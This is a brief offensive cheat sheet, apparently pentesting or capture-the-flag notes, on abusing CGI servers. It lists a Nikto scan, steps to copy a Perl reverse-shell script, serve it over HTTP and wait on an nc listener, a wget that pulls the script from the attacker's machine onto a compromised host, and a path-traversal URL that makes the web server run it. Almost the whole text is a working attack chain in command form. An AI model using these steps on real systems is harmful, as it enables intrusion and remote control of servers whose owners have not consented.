#### CGI scripts are perl scripts

A server that can execute .cgi scripts can execute perl reverse shell 

#### Find using Nikto
```
nikto -C all -host http://ip.ip/
```

#### Perl Reverse Shell
```
cp /usr/share/webshells/perl/perl-reverse-shell.pl perl.cgi
chmod u+x perl.cgi
python -m SimpleHTTPServer 80
nc -vlnp 820
```

**foothold Box**
```
wget http://mykaliIP/perl.cgi
chmod u+x perl.cgi
```

**webserver path traversal vulnerability**
```
http://WEBSERVER/VULNPATH/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/tmp/perl.cgi
```
